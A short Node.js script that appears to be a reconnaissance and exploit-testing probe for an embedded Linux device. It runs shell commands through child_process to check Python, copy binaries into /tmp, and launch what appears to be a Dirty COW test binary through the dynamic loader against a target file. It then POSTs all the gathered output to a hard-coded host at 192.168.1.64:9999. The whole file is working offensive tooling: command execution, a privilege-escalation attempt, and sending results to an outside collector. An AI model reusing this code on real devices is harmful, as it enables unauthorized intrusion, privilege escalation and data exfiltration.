"use strict";

var cp = require("child_process");
var http = require("http");

var HOST = "192.168.1.64";
var PORT = 9999;

function run(cmd, timeout) {
    try {
        return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: timeout || 25000 });
    } catch (e) {
        return "ERR " + (e.stdout ? e.stdout : e.message);
    }
}

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request(
        {
            host: HOST,
            port: PORT,
            path: path,
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(data)
            }
        },
        function (res) {
            console.log("posted " + path + " -> " + res.statusCode);
        }
    );
    req.on("error", function (e) {
        console.log("post error " + e.message);
    });
    req.write(data);
    req.end();
}

var out = {};
out.started = new Date().toISOString();

var APP = "/opt/usr/home/owner/apps_rw/xvvl3S1bvH";

out.libpython = run("ls -la /usr/lib/libpython* /lib/libpython* 2>&1");
out.python_test = run("LD_LIBRARY_PATH=/usr/lib python -c 'print 1+1' 2>&1");
out.python_ver = run("LD_LIBRARY_PATH=/usr/lib python --version 2>&1");

out.cat_gunzip = run("cat /usr/bin/gunzip > /tmp/gz2; chmod 755 /tmp/gz2; ls -laZ /tmp/gz2; /tmp/gz2 --help 2>&1 | head -2; echo rc=$?");
out.node_direct = run(APP + "/bin/node --version 2>&1; echo rc=$?");
out.loader = run("ls -la /lib/ld-linux* /usr/lib/ld-linux* 2>&1; /lib/ld-linux.so.3 /tmp/dcowtest2 /tmp/zzz_dcow_target2 1 0x45 2>&1; echo rc=$?");
out.launchpad = run("ls -la /usr/bin/launchpad-loader; launchpad-loader --help 2>&1 | head -5; echo rc=$?");
out.elfhdr = run("od -An -tx1 -N16 /tmp/dcowtest2");

post("/audit14", out);
